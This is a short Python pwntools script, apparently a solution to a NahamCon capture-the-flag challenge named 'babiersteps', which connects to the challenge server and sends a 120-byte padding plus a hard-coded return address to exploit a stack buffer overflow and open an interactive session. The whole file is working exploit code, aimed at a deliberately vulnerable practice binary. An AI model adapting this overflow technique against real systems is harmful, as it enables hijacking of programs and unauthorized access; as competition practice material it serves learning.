#!/usr/bin/env python3
import sys
from pwn import *

conn = remote('challenge.nahamcon.com', 32630)

padding = b"A"*120
address = b"\xc9\x11\x40\x00\x00\x00\x00\x00"

payload = padding + address 

print(payload)

#conn = process('./babiersteps')
print(conn.recvuntil(b'scanf?\n'))
conn.sendline(payload)
conn.interactive()
